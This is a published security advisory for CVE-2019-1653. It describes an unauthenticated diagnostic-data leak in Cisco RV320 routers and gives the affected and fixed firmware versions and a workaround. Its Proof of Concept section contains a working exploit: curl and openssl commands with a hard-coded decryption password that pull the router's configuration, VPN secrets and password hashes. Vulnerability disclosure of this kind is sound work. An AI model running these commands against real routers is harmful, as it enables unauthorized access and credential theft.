Subject: [FD] [RT-SA-2018-003] Cisco RV320 Unauthenticated Diagnostic Data
 Retrieval

Advisory: Cisco RV320 Unauthenticated Diagnostic Data Retrieval

RedTeam Pentesting discovered that the Cisco RV320 router exposes
sensitive diagnostic data without authentication through the device's
web interface.


Details
=======

Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15, 1.4.2.17
Fixed Versions: since 1.4.2.19
Vulnerability Type: Information Disclosure
Security Risk: high
Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-003
Advisory Status: published
CVE: CVE-2019-1653
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653


Introduction
============

"Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network."
(from the Cisco RV320 product page [1])


More Details
============

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface. In the device's firmware, this functionality is
implemented using a variety of CGI programs. Access to this web
interface requires prior authentication using a username and password.
RedTeam Pentesting discovered the CGI program:

/cgi-bin/export_debug_msg.exp

This program can be used to retrieve various diagnostic information from
the device, which includes its current configuration. In contrast to
other functions, this CGI program does not require any form of
authentication. It may be accessed through the router's web server,
which is available from the LAN by default. As described in [2],
firmware versions from 1.4.2 to 1.4.2.15 (including) also expose the web
server to the WAN on TCP port 8007.


Proof of Concept
================

The diagnostic data can be retrieved by issuing an HTTP POST request to
the vulnerable CGI program. OpenSSL is used to decrypt the data with the
hard-coded password "NKDebug12#$%" before unpacking it with tar (output
shortened):

------------------------------------------------------------------------
$ curl --data submitdebugmsg=1 \
  'http://192.168.1.1/cgi-bin/export_debug_msg.exp' > debug

$ openssl aes-128-cbc -salt -md md5 -d \
  -k 'NKDebug12#$%' < debug > debug.tgz

$ mkdir output && tar -xf debug.tgz -C output/

$ ls -1 output/
debug_messages.txt
etc.tgz
nk_sysconfig
var.tgz

$ cat output/nk_sysconfig
####sysconfig####

------------------------------------------------------------------------


Workaround
==========

Prevent untrusted clients from connecting to the device's web server.


Fix
===

Install firmware version 1.4.2.19 (or later) on the router.


Security Risk
=============

This vulnerability is rated as a high risk as it exposes sensitive
diagnostic information, such as the device's configuration, to
untrusted, potentially malicious parties. By retrieving this
information, attackers can obtain internal network configuration, VPN or
IPsec secrets, as well as password hashes for the router's user
accounts. Knowledge of a user's password hash is sufficient to log into
the router's web interface. Any information obtained through
exploitation of this vulnerability can be used to facilitate further
compromise of the device itself or attached networks.
